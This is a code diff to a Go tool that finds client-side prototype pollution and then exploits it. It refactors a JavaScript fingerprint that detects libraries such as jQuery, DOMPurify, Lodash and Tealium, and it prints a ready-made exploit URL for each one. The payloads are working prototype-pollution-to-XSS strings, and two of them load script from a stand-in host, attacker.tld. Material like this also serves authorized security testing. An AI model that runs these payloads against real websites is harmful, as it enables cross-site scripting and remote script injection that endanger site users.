@@ -20,79 +20,43 @@ const (
 var fingerprint string = `(() => {
   let gadgets = 'default';
   if (typeof _satellite !== 'undefined') {
-    gadgets = 'Adobe Dynamic Tag Management';
-  }
-
-  if (typeof BOOMR !== 'undefined') {
-    gadgets = 'Akamai Boomerang';
-  }
-
-  if (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined') {
-    gadgets = 'Closure';
-  }
-
-  if (typeof DOMPurify !== 'undefined') {
-    gadgets = 'DOMPurify';
-  }
-
-  if (typeof window.embedly !== 'undefined') {
-    gadgets = 'Embedly Cards';
-  }
-
-  if (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') {
+    gadgets = 'Adobe Dynamic Tag Management ';
+  } else if (typeof BOOMR !== 'undefined') {
+    gadgets = 'Akamai Boomerang ';
+  } else if (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined') {
+    gadgets = 'Closure ';
+  } else if (typeof DOMPurify !== 'undefined') {
+    gadgets = 'DOMPurify ';
+  } else if (typeof window.embedly !== 'undefined') {
+    gadgets = 'Embedly Cards ';
+  } else if (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') {
     gadgets = 'jQuery ';
-  }
-
-  if (typeof filterXSS !== 'undefined') {
-    gadgets = 'js-xss';
-  }
-
-  if (typeof ko !== 'undefined' && typeof ko.version !== 'undefined') {
-    gadgets = 'Knockout.js';
-  }
-
-  if (typeof _ !== 'undefined' && typeof _.template !== 'undefined' && typeof _.VERSION !== 'undefined') {
-    gadgets = 'Lodash <= 4.17.15';
-  }
-
-  if (typeof Marionette !== 'undefined') {
-    gadgets = 'Marionette.js / Backbone.js';
-  }
-
-  if (typeof recaptcha !== 'undefined') {
-    gadgets = 'Google reCAPTCHA';
-  }
-
-  if (typeof sanitizeHtml !== 'undefined') {
-    gadgets = 'sanitize-html';
-  }
-
-  if (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined') {
-    gadgets = 'Segment Analytics.js';
-  }
-
-  if (typeof Sprint !== 'undefined') {
-    gadgets = 'Sprint.js';
-  }
-
-  if (typeof SwiftypeObject != 'undefined') {
-    gadgets = 'Swiftype Site Search';
-  }
-
-  if (typeof utag !== 'undefined' && typeof utag.id !== 'undefined') {
-    gadgets = 'Tealium Universal Tag';
-  }
-
-  if (typeof twq !== 'undefined' && typeof twq.version !== 'undefined') {
-    gadgets = 'Twitter Universal Website Tag';
-  }
-
-  if (typeof wistiaEmbeds !== 'undefined') {
-    gadgets = 'Wistia Embedded Video';
-  }
-
-  if (typeof $ !== 'undefined' && typeof $.zepto !== 'undefined') {
-    gadgets = 'Zepto.js';
+  } else if (typeof filterXSS !== 'undefined') {
+    gadgets = 'js-xss ';
+  } else if (typeof ko !== 'undefined' && typeof ko.version !== 'undefined') {
+    gadgets = 'Knockout.js ';
+  } else if (typeof _ !== 'undefined' && typeof _.template !== 'undefined' && typeof _.VERSION !== 'undefined') {
+    gadgets = 'Lodash <= 4.17.15 ';
+  } else if (typeof Marionette !== 'undefined') {
+    gadgets = 'Marionette.js / Backbone.js ';
+  } else if (typeof recaptcha !== 'undefined') {
+    gadgets = 'Google reCAPTCHA ';
+  } else if (typeof sanitizeHtml !== 'undefined') {
+    gadgets = 'sanitize-html ';
+  } else if (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined') {
+    gadgets = 'Segment Analytics.js ';
+  } else if (typeof Sprint !== 'undefined') {
+    gadgets = 'Sprint.js ';
+  } else if (typeof SwiftypeObject != 'undefined') {
+    gadgets = 'Swiftype Site Search ';
+  } else if (typeof utag !== 'undefined' && typeof utag.id !== 'undefined') {
+    gadgets = 'Tealium Universal Tag ';
+  } else if (typeof twq !== 'undefined' && typeof twq.version !== 'undefined') {
+    gadgets = 'Twitter Universal Website Tag ';
+  } else if (typeof wistiaEmbeds !== 'undefined') {
+    gadgets = 'Wistia Embedded Video ';
+  } else if (typeof $ !== 'undefined' && typeof $.zepto !== 'undefined') {
+    gadgets = 'Zepto.js ';
   }
 
  return gadgets;
@@ -165,53 +129,25 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
                 
             log.Printf(Info + " Gadget found: " + string(res1))
             time.Sleep(2 * time.Second)
-                
-            result1 := strings.Contains(string(res1), "Adobe Dynamic Tag Management")
-            result2 := strings.Contains(string(res1), "Akamai Boomerang")
-            result3 := strings.Contains(string(res1), "Closure")
-            result4 := strings.Contains(string(res1), "DOMPurify")
-            result5 := strings.Contains(string(res1), "Embedly Cards")
-            result6 := strings.Contains(string(res1), "jQuery")
-            result7 := strings.Contains(string(res1), "js-xss")
-            result8 := strings.Contains(string(res1), "Knockout.js")
-            result9 := strings.Contains(string(res1), "Lodash <= 4.17.15")
-            result10 := strings.Contains(string(res1), "Marionette.js / Backbone.js")
-            result11 := strings.Contains(string(res1), "Google reCAPTCHA")
-            result12 := strings.Contains(string(res1), "sanitize-html")
-            result13 := strings.Contains(string(res1), "Segment Analytics.js")
-            result14 := strings.Contains(string(res1), "Sprint.js")
-            result15 := strings.Contains(string(res1), "Swiftype Site Search")
-            result16 := strings.Contains(string(res1), "Tealium Universal Tag")
-            result17 := strings.Contains(string(res1), "Twitter Universal Website Tag")
-            result18 := strings.Contains(string(res1), "Wistia Embedded Video")
-            result19 := strings.Contains(string(res1), "Zepto.js")
-            result20 := strings.Contains(string(res1), "default")
         
-                
-            if result20 == true { //undefined
+            if strings.Contains(string(res1), "default") {
                log.Printf(Error + " No gadget found") 
                log.Printf(Info + " Website is vulnerable to Prototype Pollution, but not automatically exploitable")
-                
-            } else if result1 == true { //Adobe Dynamic
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[src]=data:,alert(1)//") 
-                
-            } else if result2 == true { //Akamai Boomerang
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js") 
-                
-            } else if result3 == true { //Closure
+            } else if strings.Contains(string(res1), "Adobe Dynamic Tag Management") {
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[src]=data:,alert(1)//")
+            } else if strings.Contains(string(res1), "Akamai Boomerang") {
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js")
+            } else if strings.Contains(string(res1), "Closure") {
                log.Printf(Info + " Displaying all possible payloads")
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[*%%20ONERROR]=1&__proto__[*%20SRC]=1") 
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//")
-                
-            } else if result4 == true { //DOMPurify
+            } else if strings.Contains(string(res1), "DOMPurify") {
                log.Printf(Info + " Displaying all possible payloads")
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src") 
-           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[documentMode]=9")
-               
-            } else if result5 == true { //Embedly Cards
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[documentMode]=9")
+            } else if strings.Contains(string(res1), "Embedly") {
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[onload]=alert(1)") 
-                
-            } else if result6 == true { //jQuery
+            } else if strings.Contains(string(res1), "jQuery") {
                log.Printf(Info + " Displaying all possible payloads")
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[context]=<img/src/onerror%%3dalert(1)>&__proto__[jquery]=x")
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script")
@@ -220,56 +156,39 @@ dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[url]=data:,alert(1)//")
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%%3dalert(1)>&__proto__[div][2]=1")
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(1)>")
-                
-           } else if result7 == true { //js-xss
+            } else if strings.Contains(string(res1), "js-xss") {
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src") 
-                
-           } else if result8 == true { //Knockout.js
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,") 
-                
-           } else if result9 == true { //Lodash <= 4.17.15
+            } else if strings.Contains(string(res1), "Knockout.js") {
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,")
+            } else if strings.Contains(string(res1), "Lodash <= 4.17.15") {
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[sourceURL]=%%E2%80%A8%%E2%80%A9alert(1)") 
-                
-           } else if result10 == true { //Marionette.js / Backbone.js
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)") 
-                
-           } else if result11 == true { //Google reCAPTCHA
+            } else if strings.Contains(string(res1), "Marionette.js / Backbone.js") {
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)")
+            } else if strings.Contains(string(res1), "Google reCAPTCHA") {
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[srcdoc][]=<script>alert(1)</script>") 
-                
-           } else if result12 == true { //sanitize-html
+            } else if strings.Contains(string(res1), "sanitize-html") {
                log.Printf(Info + " Displaying all possible payloads")
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[*][]=onload")
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[innerText]=<script>alert(1)</script>") 
-                
-           } else if result13 == true { //Segment Analytics.js
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%%3dalert(1)>&__proto__[script][2]=1") 
-                
-           } else if result14 == true { //Sprint.js
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[div][intro]=<img%%20src%%20onerror%%3dalert(1)>") 
-                
-           } else if result15 == true { //Swiftype Site Search
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[xxx]=alert(1)") 
-                
-           } else if result16 == true { //Tealium Universal Tag
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[innerText]=<script>alert(1)</script>")
+            } else if strings.Contains(string(res1), "Segment Analytics.js") {
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%%3dalert(1)>&__proto__[script][2]=1")
+            } else if strings.Contains(string(res1), "Sprint.js") {
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[div][intro]=<img%%20src%%20onerror%%3dalert(1)>")
+            } else if strings.Contains(string(res1), "Swiftype Site Search") {
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[xxx]=alert(1)")
+            } else if strings.Contains(string(res1), "Tealium Universal Tag") {
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js") 
-                
-           } else if result17 == true { //Twitter Universal Website Tag
+            } else if strings.Contains(string(res1), "Twitter Universal Website Tag") {
                log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[attrs][src]=1&__proto__[hif][]=javascript:alert(1)") 
-                
-           } else if result18 == true { //Wistia Embedded Video
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[innerHTML]=<img/src/onerror=alert(1)>") 
-                
-           } else if result19 == true { //Zepto.js
-               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[onerror]=alert(1)") 
-                
-           } else {
+            } else if strings.Contains(string(res1), "Wistia Embedded Video") {
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[innerHTML]=<img/src/onerror=alert(1)>")
+            } else if strings.Contains(string(res1), "Zepto.js") {
+               log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[onerror]=alert(1)")
+            } else {
                log.Printf(Error + " An unexcepted error occured")
-           }
-                
-           break
- 
-        }
-      
+            }
+            
+            break 
+        }      
     }
-        
 }
